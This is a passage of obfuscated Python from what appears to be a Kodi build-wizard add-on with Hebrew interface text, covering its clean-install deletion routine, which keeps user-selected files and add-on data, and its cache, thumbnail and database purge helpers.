				elif O00OO0OO0OO0000O0 =='MyVideos116.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4956
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4957
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4958
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'skin.Premium.mod'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4959
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4960
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'skin.phenomenal'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4961
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4962
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'skin.titan'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4964
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4965
				elif O00OO0OO0OO0000O0 =='sources.xml'and O00OOO00OOO00000O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4967
				elif O00OO0OO0OO0000O0 =='quicknav.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4970
				elif O00OO0OO0OO0000O0 =='x1101.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4971
				elif O00OO0OO0OO0000O0 =='b-srtym-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4972
				elif O00OO0OO0OO0000O0 =='x1102.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4973
				elif O00OO0OO0OO0000O0 =='b-sdrvt-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4974
				elif O00OO0OO0OO0000O0 =='x1112.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4975
				elif O00OO0OO0OO0000O0 =='b-tlvvyzyh-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4976
				elif O00OO0OO0OO0000O0 =='x1111.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4977
				elif O00OO0OO0OO0000O0 =='b-tvknyshrly-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4978
				elif O00OO0OO0OO0000O0 =='x1110.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4979
				elif O00OO0OO0OO0000O0 =='b-yldym-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4980
				elif O00OO0OO0OO0000O0 =='x1114.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4981
				elif O00OO0OO0OO0000O0 =='b-mvzyqh-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4982
				elif O00OO0OO0OO0000O0 =='mainmenu.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4983
				elif O00OO0OO0OO0000O0 =='skin.Premium.mod.properties'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4984
				elif O00OO0OO0OO0000O0 =='x1122.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4986
				elif O00OO0OO0OO0000O0 =='b-spvrt-b.DATA.xml'and O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4987
				elif O00OO0OO0OO0000O0 =='favourites.xml'and O00OOO00OOO00000O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4992
				elif O00OO0OO0OO0000O0 =='guisettings.xml'and O00OOO00OOO00000O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4994
				elif O00OO0OO0OO0000O0 =='profiles.xml'and O00OOO00OOO00000O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4995
				elif O00OO0OO0OO0000O0 =='advancedsettings.xml'and O00OOO00OOO00000O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4996
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4997
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'program.apollo'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4998
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4999
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.telemedia'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5000
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.elementum'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5003
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5005
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'weather.yahoo'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5006
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.quasar'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5007
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'program.apollo'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5008
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5009
				elif O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5010
				elif O00OO0OO0OO0000O0 in LOGFILES :wiz .log ("Keep Log File: %s"%O00OO0OO0OO0000O0 ,xbmc .LOGNOTICE )#line:5011
				elif O00OO0OO0OO0000O0 .endswith ('.db'):#line:5012
					try :#line:5013
						if O00OO0OO0OO0000O0 ==O000O0O00000O0O0O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00OO0OO0OO0000O0 ,KODIV ),xbmc .LOGNOTICE )#line:5014
						else :os .remove (os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ))#line:5015
					except Exception as O0OO0O0OO00OO00O0 :#line:5016
						if not O00OO0OO0OO0000O0 .startswith ('Textures13'):#line:5017
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5018
							wiz .log ("-> %s"%(str (O0OO0O0OO00OO00O0 )),xbmc .LOGNOTICE )#line:5019
							wiz .purgeDb (os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ))#line:5020
				else :#line:5021
					DP .update (int (wiz .percentage (O000O0O0OOOOOOOO0 ,OO0OOOO0O00O00OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OO0000O0 ),'')#line:5022
					try :os .remove (os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ))#line:5023
					except Exception as O0OO0O0OO00OO00O0 :#line:5024
						wiz .log ("Error removing %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:5025
						wiz .log ("-> / %s"%(str (O0OO0O0OO00OO00O0 )),xbmc .LOGNOTICE )#line:5026
			if DP .iscanceled ():#line:5027
				DP .close ()#line:5028
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5029
				return False #line:5030
		for O0OO0OOOO00O00000 ,O0OOOOO0OO0OOOO00 ,O0O0O00O00OOO000O in os .walk (OO00OOOO00O0OO0O0 ,topdown =True ):#line:5031
			O0OOOOO0OO0OOOO00 [:]=[O000O00OO0000OOO0 for O000O00OO0000OOO0 in O0OOOOO0OO0OOOO00 if O000O00OO0000OOO0 not in EXCLUDES ]#line:5032
			for O00OO0OO0OO0000O0 in O0OOOOO0OO0OOOO00 :#line:5033
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO0OO0OO0000O0 ),'')#line:5034
			  if O00OO0OO0OO0000O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5035
			   if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5036
			    if not (O00OO0OO0OO0000O0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5038
			      if not (O00OO0OO0OO0000O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5039
			       if not (O00OO0OO0OO0000O0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5040
			        if not (O00OO0OO0OO0000O0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5041
			         if not (O00OO0OO0OO0000O0 =='program.apollo'and KEEPINFO =='true'):#line:5042
			          if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5043
			           if not (O00OO0OO0OO0000O0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5044
			            if not (O00OO0OO0OO0000O0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5045
			             if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5046
			              if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5047
			               if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5048
			                if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5049
			                 if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5050
			                  if not (O00OO0OO0OO0000O0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5051
			                   if not (O00OO0OO0OO0000O0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5052
			                    if not (O00OO0OO0OO0000O0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5053
			                     if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5054
			                      if not (O00OO0OO0OO0000O0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5055
			                       if not (O00OO0OO0OO0000O0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5056
			                           if not (O00OO0OO0OO0000O0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5060
			                            if not (O00OO0OO0OO0000O0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5061
			                             if not (O00OO0OO0OO0000O0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5062
			                              if not (O00OO0OO0OO0000O0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5063
			                               if not (O00OO0OO0OO0000O0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5064
			                                  shutil .rmtree (os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),ignore_errors =True ,onerror =None )#line:5066
			if DP .iscanceled ():#line:5067
				DP .close ()#line:5068
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5069
				return False #line:5070
		DP .close ()#line:5071
		wiz .clearS ('build')#line:5072
		if over ==True :#line:5073
			return True #line:5074
		elif install =='restore':#line:5075
			return True #line:5076
		elif install :#line:5077
			buildWizard (install ,'normal',over =True )#line:5078
		else :#line:5079
			if INSTALLMETHOD ==1 :OOO0OOOO000O0O000 =1 #line:5080
			elif INSTALLMETHOD ==2 :OOO0OOOO000O0O000 =0 #line:5081
			else :OOO0OOOO000O0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5082
			if OOO0OOOO000O0O000 ==1 :wiz .reloadFix ('fresh')#line:5083
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5084
	else :#line:5085
		if not install =='restore':#line:5086
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5087
			wiz .refresh ()#line:5088
def clearCache ():#line:5093
		wiz .clearCache ()#line:5094
def fixwizard ():#line:5098
		wiz .fixwizard ()#line:5099
def totalClean ():#line:5101
		wiz .clearCache ()#line:5103
		wiz .clearPackages ('total')#line:5104
		clearThumb ('total')#line:5105
		cleanfornewbuild ()#line:5106
def cleanfornewbuild ():#line:5107
		try :#line:5108
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5109
		except :#line:5110
			pass #line:5111
		try :#line:5112
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5113
		except :#line:5114
			pass #line:5115
		try :#line:5116
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5117
		except :#line:5118
			pass #line:5119
def clearThumb (type =None ):#line:5120
	O0OO0OO0000O0O0OO =wiz .latestDB ('Textures')#line:5121
	if not type ==None :OO0O0OO00O0OOOO0O =1 #line:5122
	else :OO0O0OO00O0OOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OO0OO0000O0O0OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5123
	if OO0O0OO00O0OOOO0O ==1 :#line:5124
		try :wiz .removeFile (os .join (DATABASE ,O0OO0OO0000O0O0OO ))#line:5125
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OO0OO0000O0O0OO )#line:5126
		wiz .removeFolder (THUMBS )#line:5127
	else :wiz .log ('Clear thumbnames cancelled')#line:5129
	wiz .redoThumbs ()#line:5130
def purgeDb ():#line:5132
	O0000OO0000OO00OO =[];OO0O0OO0O0OO00OO0 =[]#line:5133
	for OOO000O0OO00OOO00 ,O00000OO0O0000OOO ,OOO000O0O0OOO00OO in os .walk (HOME ):#line:5134
		for OOOO0O0O0000OO00O in fnmatch .filter (OOO000O0O0OOO00OO ,'*.db'):#line:5135
			if OOOO0O0O0000OO00O !='Thumbs.db':#line:5136
				O000000O0OOOO0O0O =os .path .join (OOO000O0OO00OOO00 ,OOOO0O0O0000OO00O )#line:5137
				O0000OO0000OO00OO .append (O000000O0OOOO0O0O )#line:5138
				OO000OOOOO00000OO =O000000O0OOOO0O0O .replace ('\\','/').split ('/')#line:5139
				OO0O0OO0O0OO00OO0 .append ('(%s) %s'%(OO000OOOOO00000OO [len (OO000OOOOO00000OO )-2 ],OO000OOOOO00000OO [len (OO000OOOOO00000OO )-1 ]))#line:5140
	if KODIV >=16 :#line:5141
		OOOOOO0OO0O0000O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O0OO0O0OO00OO0 )#line:5142
		if OOOOOO0OO0O0000O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5143
		elif len (OOOOOO0OO0O0000O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5144
		else :#line:5145
			for O00OOOO0O0OO0O0O0 in OOOOOO0OO0O0000O0 :wiz .purgeDb (O0000OO0000OO00OO [O00OOOO0O0OO0O0O0 ])#line:5146
	else :#line:5147
		OOOOOO0OO0O0000O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O0OO0O0OO00OO0 )#line:5148
		if OOOOOO0OO0O0000O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5149
		else :wiz .purgeDb (O0000OO0000OO00OO [O00OOOO0O0OO0O0O0 ])#line:5150
def fastupdatefirstbuild (OOOO000O0OO00OO0O ):#line:5156
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5158
	if ENABLE =='Yes':#line:5159
		if not NOTIFY =='true':#line:5160
			O0000O0O0OOO0OOO0 =wiz .workingURL (NOTIFICATION )#line:5161
			if O0000O0O0OOO0OOO0 ==True :#line:5162
				OOOO00000000000OO ,O00000OOOO00OOOOO =wiz .splitNotify (NOTIFICATION )#line:5163
